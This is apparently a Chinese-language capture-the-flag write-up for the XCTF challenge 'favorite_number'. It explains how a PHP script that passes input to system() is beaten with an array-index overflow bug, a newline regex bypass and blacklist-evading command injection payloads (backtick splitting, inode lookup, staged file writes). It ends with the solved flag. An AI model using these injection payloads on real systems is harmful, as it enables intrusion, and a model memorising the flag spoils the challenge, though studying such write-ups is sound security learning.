# favorite_number

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=4f9d83db-6b29-4c4c-904e-df4090ff1cf9_2)

这题个人感觉不错，同时教了萌新三个知识点，且内容也很直接，就把考点摆在那里看你会不会。

场景进去是一个php脚本。

```php
<?php
//php5.5.9
$stuff = $_POST["stuff"];
$array = ['admin', 'user'];
if($stuff === $array && $stuff[0] != 'admin') {
    $num= $_POST["num"];
    if (preg_match("/^\d+$/im",$num)){
        if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num)){
            echo "my favorite num is:";
            system("echo ".$num);
        }else{
            echo 'Bonjour!';
        }
    }
} else {
    highlight_file(__FILE__);
}
```

虽然内容不多，但是隐藏的知识可不少。system函数肯定就是我们的目标了，只是上面有整整三层过滤。一层一层看吧。

```php
if($stuff === $array && $stuff[0] != 'admin')
```

我们都知道php的==符号有很多东西可以利用，可这会直接===强等于了，要求$stuff必须完全等于$array，接下来又要求$stuff的首元素不等于admin。这两者很明显就是矛盾的。题目刻意写出了php的版本，可能是这个版本下有能用的漏洞？这里就要求经验了，想我既不用php经验也不足的完全不知道往哪里找。最后看writeup在[官网](https://bugs.php.net/bug.php?id=69892)找到了描述。

```php
var_dump([0 => 0] === [0x100000000 => 0]); // bool(true)
```

意思就是说数组的0索引所对应的元素完全相等于数组0x100000000所对应的元素。影响范围可以在[这里](https://3v4l.org/Sjdf8)找到，发现5.5.9包括在内。

0x100000000的十进制形式就是4294967296。这时我们就可以构造绕过第一个if的payload了。

- stuff\[4294967296]=admin&stuff\[1]=user&num=1

![payload](../../images/payload.png)

- ### Tips
- > bp中可以在request的右上角的第三个按钮中的选项自动改变请求方法，比如这里就将get方法改成了要求的post方法。
- > 改变为post方法后传参是放在下面的，格式如图。

我不知道php内部是怎么判断两个数组完全相等的，但是我的猜测是这样的：一个一个判断两个数组中的键值对，如果全部返回true则完全相等。所以这里发生的情况是php判断传入的数组stuff\[4294967296]是否等于array\[0]，上面的bug可以看出结果相等，后面也相等，所以返回true；判断stuff\[0] != 'admin'也返回true，因为stuff没有0这个键，只有4294967296，故整个if语句成立。（可能不对小心被我带偏(･_･;）

```php
if (preg_match("/^\d+$/im",$num))
```

- ### 一些正则
- > ^ : 匹配搜索字符串开始的位置。如果标志中包括 m（多行搜索）字符，^ 还将匹配 \n 或 \r 后面的位置。如果将 ^ 用作括号表达式中的第一个字符，就会对字符集取反
- > \d : 数字字符匹配，等效于\[0-9]
- > $ : 匹配搜索字符串结束的位置。如果标志中包括 m（多行搜索）字符，$ 还将匹配 \n 或 \r 前面的位置。
- > \i : 大小写不敏感匹配。
- > \m : 默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， "行首"元字符 (^) 仅匹配字符串的开始位置， 而"行末"元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 "\n" 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。

/^\d+\$/im 判断$num是否全部是数字。一般来说直接\n换行绕过就行了，但是由于使用了\m，我们需要考虑别的换行符。

- stuff\[4294967296]=admin&stuff\[1]=user&num=1%0als

%0a也是一种换行符，注意\m的描述：“如果目标字符串 中没有 "\n" 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。”。所以^和$仍然会只匹配字符串开头%0a前面的内容，成功绕过第二个if。

```php
if (!preg_match("/sh|wget|nc|python|php|perl|\?|flag|}|cat|echo|\*|\^|\]|\\\\|'|\"|\|/i",$num))
```

乍一看有点离谱，常见的用法全部黑名单了。不过你永远想不到黑客的脑洞可以有多大。最简单的一种方式是使用``绕过匹配。

- stuff[4294967296]=admin&stuff[1]=user&num=1%0aca\``t /fl``ag

也可以跟官方writeup一样用inode读取flag。ls -i /可以查看根目录下所有文件的inode值。

- stuff[4294967296]=admin&stuff[1]=user&num=1%0atac \`find / -inum 3673632`

tac是cat的反向，会把文件的行序倒着输出。比如3行的文件“1     2      3”用cat输出是“1     2      3”，用tac就是“3      2       1”，只倒转行序不倒转每一行的内容。

或者绕个弯把flag文件名分步骤追加到另一个文件里。

- stuff\[4294967296]=admin&stuff\[1]=user&num=1%0aprintf /fla > /tmp/zer0b<br>stuff\[4294967296]=admin&stuff[1]=user&num=1%0aprintf g >> /tmp/zer0b<br>stuff\[4294967296]=admin&stuff\[1]=user&num=1%0atac \`tac /tmp/zer0b`

- ### Flag
- > cyberpeace{5baa9abc3af84774b3307ef0cbb098ab}